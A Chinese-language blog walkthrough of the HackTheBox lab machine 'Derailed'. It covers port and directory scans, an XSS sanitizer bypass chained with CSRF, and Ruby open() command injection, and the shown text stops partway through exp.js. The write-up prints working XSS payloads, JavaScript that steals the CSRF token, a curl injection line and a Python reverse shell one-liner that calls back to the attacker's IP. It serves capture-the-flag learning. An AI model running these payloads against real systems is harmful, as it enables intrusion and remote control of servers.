---
title: Derailed - HackTheBox
url: https://darkwing.moe/2022/11/28/Derailed-HackTheBox/
source: 喵喵喵喵
date: 2022-11-29
fetch_date: 2025-10-03T23:56:24.427388
---

# Derailed - HackTheBox

[![](/img/avatar.jpg)](/)

##### 暗羽

Discord@darkwing\_nya

* [主页](/)
* [Archives](/archives)
* [Tags](/tags)
* [Categories](/categories)
* [Github](https://github.com/zjicmDarkWing)
* [Twitter](https://twitter.com/darkwing_nya)
* [Buy me a coffee](https://www.buymeacoffee.com/darkwing_nya)
* [About](https://darkwing.moe/2015/01/01/about/)

Derailed - HackTheBox

# Derailed - HackTheBox

##### 2022-11-28

#### TOC

1. [1. 基本信息](#基本信息)
   1. [1.1. 10.10.11.190](#10-10-11-190)
2. [2. 端口扫描](#端口扫描)
   1. [2.1. 3000](#3000)
3. [3. 目录扫描](#目录扫描)
   1. [3.1. /rails/info/properties](#rails-info-properties)
   2. [3.2. routes](#routes)
   3. [3.3. clipnotes](#clipnotes)
   4. [3.4. report](#report)
4. [4. XSS & CSRF](#XSS-amp-CSRF)
   1. [4.1. xss](#xss)
   2. [4.2. reverse shell](#reverse-shell)
   3. [4.3. vuln](#vuln)
   4. [4.4. administration](#administration)
   5. [4.5. token.js](#token-js)
   6. [4.6. evilform.js](#evilform-js)
   7. [4.7. exp.js](#exp-js)
5. [5. user flag](#user-flag)
6. [6. 信息](#信息)
   1. [6.1. alice](#alice)
   2. [6.2. openmediavault-webgui](#openmediavault-webgui)
7. [7. 提权 & root flag](#提权-amp-root-flag)
   1. [7.1. shadow](#shadow)
8. [8. 参考资料](#参考资料)

# Derailed - HackTheBox

2022-11-28

# 基本信息

* <https://www.hackthebox.com/home/machines/profile/512>
* ## 10.10.11.190

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022112601.jpg)

# 端口扫描

22和3000:

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ``` | ``` $ nmap -sC -sV -Pn 10.10.11.190 Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-26 20:26 CST Nmap scan report for 10.10.11.190 Host is up (0.32s latency). Not shown: 998 filtered tcp ports (no-response) PORT     STATE SERVICE VERSION 22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0) | ssh-hostkey: |   3072 1623b09ade0e3492cb2b18170ff27b1a (RSA) |   256 50445e886b3e4b5bf9341dede52d91df (ECDSA) |_  256 0abd9223df44026f278da6abb4077837 (ED25519) 3000/tcp open  http    nginx 1.18.0 |_http-title: derailed.htb |_http-server-header: nginx/1.18.0 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 287.58 seconds ``` |

## 3000

clipnote：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022112602.jpg)

# 目录扫描

目录扫描发现rails,(最重要的是rails这个，dirsearch默认能扫出来，gobuster常规扫描没这个结果)：

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ``` | ``` gobuster dir -w ~/Tools/dict/SecLists/Discovery/Web-Content/common.txt  -t 50 -u http://10.10.11.190:3000/  /500                  (Status: 200) [Size: 1635] /404                  (Status: 200) [Size: 1722] /administration       (Status: 302) [Size: 96] [--> http://10.10.11.190:3000/login] /favicon.ico          (Status: 200) [Size: 0] /logout               (Status: 302) [Size: 91] [--> http://10.10.11.190:3000/] /login                (Status: 200) [Size: 5592] /robots.txt           (Status: 200) [Size: 99] /register             (Status: 200) [Size: 5908]  dirsearch -u http://10.10.11.190:3000/  [20:10:32] 200 -    2KB - /rails/info/properties ``` |

## /rails/info/properties

rails的环境变量等信息：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022112603.jpg)

## routes

根据文档查看routes，得到所有路由信息：

* Class: Rails::InfoController — Documentation for rails/rails (main)
  <https://www.rubydoc.info/github/rails/rails/Rails/InfoController>

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022112604.jpg)

## clipnotes

随意测试提交，修改id为1知道alice用户：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022112605.jpg)

## report

另外存在report功能，应该是后端有个bot会查看我们提交的内容：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022112606.jpg)

# XSS & CSRF

用到的漏洞是这个，因为cookie有httponly，所以需要结合csrf进行利用：

* 1530898 Rails::Html::SafeListSanitizer vulnerable to xss attack in an environment that allows the style tag

  <https://hackerone.com/reports/1530898>

大概流程

1. 通过XSS去获取administration页面的结构
2. 获取有效csrf token，攻击/administration/reports

## xss

注册用户名，xss：

|  |  |
| --- | --- |
| ``` 1 2 ``` | ``` # <any 40 characters><bypass-pattern><xss-payload> miaomiaomiaomiaomiaomiaomiaomiaomiaomiao<select<style/><img src="http://10.10.14.3:7777"> ``` |

xss payload作为用户名，任意内容提交report，测试执行，成功触发xss：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022112607.jpg)

后续就是一步步，通过xss获取信息,根据获取到的后台信息，我们知道需要获取有效的authenticity\_token，然后csrf利用report\_log处的命令注入：

要发帖，我们需要先制作一个恶意表单，然后分配获取`authenticity_token`的和 cmd 注入负载

最终构造出完整exp,整段js编码后注入到用户名中：

* Character Code Finder
  <http://www.mauvecloud.net/charsets/CharCodeFinder.html>

|  |  |
| --- | --- |
| ``` 1 ``` | ``` miaomiaomiaomiaomiaomiaomiaomiaomiaomiao<select<style/><img src="http://10.10.14.3:7777" onerror="eval(String.fromCharCode(<obfuscated-char-code>))"> ``` |

测试，每一步都成功执行，包括测试的curl命令注入：

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022112608.jpg)

## reverse shell

修改命令，得到reverse shell：

|  |  |
| --- | --- |
| ``` 1 ``` | ``` document.getElementById('badform').elements.report_log.value = '|python3 -c \'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("bash")\''; ``` |

![](https://github.com/zjicmDarkWing/images2022/raw/main/2022112609.jpg)

## vuln

查看代码可以看到是直接用了ruby的open函数，特性导致的命令注入：

* Module: Kernel (Ruby 2.1.0)
  <https://ruby-doc.org/core-2.1.0/Kernel.html#method-i-open>

如果`path`以管道字符 ( `"|"`) 开头，则会创建一个子进程，并通过一对管道连接到调用者。返回的[IO](https://ruby-doc.org/core-2.1.0/IO.html)对象可用于写入标准输入并从此子进程的标准输出中读取。

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 ``` | ``` # /var/www/rails-app/app/controllers/admin_controller.rb  report_log = params[:report_log] begin     file = open(report_log) ``` |

## administration

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` <form method="post" action="/administration/reports">     <input type="hidden" name="authenticity_token" id="authenticity_token" value="<authenticity_token>" autocomplete="off">     <input type="text" class="form-control" name="report_log" value="report_23_11_2022.log" hidden="">     <label class="pt-4"> 23.11.2022</label>     <button name="button" type="submit">Download</button> </form> ``` |

## token.js

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 ``` | ``` var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "http://derailed.htb:3000/administration", true); xmlHttp.send( null );  // an arbitrary delay to ensure the page is rendered setTimeout(function() {     var doc = new DOMParser().parseFromString(xmlHttp.responseText, 'text/html');     var token = doc.getElementById('authenticity_token').value; }, 2000); ``` |

## evilform.js

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 ``` | ``` // just copy the form code from above and clean it up a bit var newForm = new DOMParser().parseFromString('<form id="badform" method="post" action="/administration/reports">    <input type="hidden" name="authenticity_token" id="authenticity_token" value="placeholder" autocomplete="off">    <input id="report_log" type="text" class="form-control" name="report_log" value="placeholder" hidden="">    <button name="button" type="submit">Submit</button>', 'text/html'); document.body.append(newForm.forms.badform); document.getElementById('badform').elements.report_log.value = '|curl http://<ip>/?cmdi'; document.getElementById('badform').elements.authenticity_token.value = token; document.getElementById('badform').submit(); ``` |

## exp.js

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 ``` | ``` var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "http://derailed.htb:3000/administration", true); xmlHttp.send( null ); // send a signal to indicate which step has been achieved var x = document.createElement("IMG"); x.src = 'http://10.10.14.3:7777/?step1';  setTimeout(function() {     // send a signal to indicate which step has been achieved     ...